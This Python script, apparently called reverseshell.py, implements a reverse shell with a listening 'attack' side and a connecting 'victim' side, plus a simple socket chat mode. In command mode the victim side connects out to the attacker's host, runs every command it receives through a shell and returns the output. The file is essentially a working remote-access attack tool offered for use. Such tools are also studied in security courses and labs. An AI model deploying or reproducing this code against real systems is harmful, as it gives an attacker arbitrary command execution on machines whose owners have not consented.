import sys
import getopt
import socket
from threading import Thread
import subprocess
import os
import pickle

class Chat:
    def __init__(self,message):
        self.message = message

TARGET = ''
PORT = 0
COMMAND = False
LISTEN = False
SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Command Mode Off
def send(SOCK):
    while True:
        message = input()
        print('Message to Send: ')
        if message == 'exit':
            print('[*] Connection closed')
            sys.exit(0)
        try:
            SOCK.send(message.encode())
        except:
            print('[*] Connection closed')
            sys.exit(0)

def recieve(SOCK):
    global LISTEN, COMMAND
    while True:
        print('Message to Send: ')
        try:
            message = SOCK.recv(4096).decode()
        except Exception:
            sys.exit(0)
        
        if message == '':
            sys.exit(0)
            
        if message == 'exit':
            print('[*] Connection closed')
            sys.exit(0)
        
        print("------------------------------------------------")
        print(message)
        print("------------------------------------------------")

def attackchat():
    global SOCK, TARGET, PORT
    print('[*] Waiting for connection...')
    SOCK.bind((TARGET, PORT))
    SOCK.listen(1)
    while True:
        con, TARGET = SOCK.accept()
        print(f'[*] Connection has been established | {TARGET[0]}:{PORT}')
        recievemessage = Thread(target=recieve,args=(con,))
        sendmessage = Thread(target=send,args=(con,))
        recievemessage.start()
        sendmessage.start()

        recievemessage.join()
        sendmessage.join()

        SOCK.close()
        con.close()

def victimchat():
    global SOCK, TARGET, PORT
    SOCK.connect((TARGET,PORT))
    while True:
        print('[*] Connection has been established')
        recievemessage = Thread(target=recieve,args=(SOCK,))
        sendmessage = Thread(target=send, args=(SOCK,))
        recievemessage.start()
        sendmessage.start()

        recievemessage.join()
        sendmessage.join()

        SOCK.close()

#Command Mode ON
def attack_send_req(Con):
    while True:
        try:
            directory = os.getcwd()
            command = input(f'{directory}>')
            if command[:2] == 'cd':
                os.chdir(command[3:])
                directory = os.getcwd()
                command = input(f'{directory}>')
                Con.send(command.encode())
            elif(command == 'exit'):
                print('[*] Connection closed')
                Con.send(command.encode())
                break
            else:
                Con.send(command.encode())
        except:
            break

def attack_recv_res(Con):
    while True:
        try:
            buffer = Con.recv(4096).decode()
        except:
            break
        if buffer =='':
            break
        print(buffer)

def attack():
    global PORT, SOCK, TARGET
    print('[*] Waiting for connection...')
    SOCK.bind(('',PORT))
    SOCK.listen(1)
    Victim, _ = SOCK.accept()
    print(f'[*] Connection has been established | {TARGET}:{PORT}')
    asr = Thread(target=attack_send_req, args=(Victim,))
    arr = Thread(target=attack_recv_res, args=(Victim,))
    asr.start()
    arr.start()
    asr.join()
    arr.join()
    SOCK.close()

def victim_exec_req(Con):
    while True:
        try:
            command = Con.recv(4096).decode()
        except KeyboardInterrupt:
            break
        if command == 'exit':
            sys.exit(0)
        elif command[:2] == 'cd':
            os.chdir(command[3:])
        else:
            process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = process.communicate()
            if stdout == b'':
                Con.send(stderr)
            else:
                Con.send(stdout)

def victim():
    global TARGET, PORT, SOCK
    SOCK.connect((TARGET,PORT))
    print('[*] Connection has been established')
    victim_exec_req(SOCK)
    SOCK.close()

def help():
    print('Usage:')
    print('reverseshell.py -p [port] -l')
    print('reverseshell.py -t [target_host] -p [port]')
    print('reverseshell.py -p [port] -l -c')
    print('reverseshell.py -t [target_host] -p -c')
    print(' ')
    print('Desciption:')
    print('-t --target  - set the target')
    print('-p --port    - set the port to be used (between 10 and 4096)')
    print('-l --listen  - listen on [target]:[port] for incoming connections')
    print('-c --command  - initialize a command shell')
    print(' ')
    print('Example:')
    print('reverseshell.py -p 8000 -l')
    print('reverseshell.py -t 127.0.0.1 -p 8000')
    print('reverseshell.py -p 8000 -l -c')
    print('reverseshell.py -t 127.0.0.1 -p 8000 -c')

def main():
    global TARGET, PORT, COMMAND, LISTEN
    try:
        args, _ = getopt.getopt(sys.argv[1:],"t:p:c",['target=','port=','command'])
    except getopt.GetoptError:
        args, _ = getopt.getopt(sys.argv[1:],"p:l c",['port=','listen','command'])
    try:
        for key, value in args:
            if key == '-t' or key == '--target':
                TARGET = value
            if key == '-p' or key == '--port':
                PORT = int(value)
            if key == '-l' or key == '--listen':
                LISTEN = True
            if key == '-c' or key == '--command':
                COMMAND = True
        if LISTEN == True and COMMAND == False:
            attackchat()
        elif LISTEN == True and COMMAND == True:
            attack()
        elif LISTEN == False and COMMAND == False:
            victimchat()
        elif LISTEN == False and COMMAND == True:
            victim()
    except:
        help()

if __name__ == '__main__':
    main()
            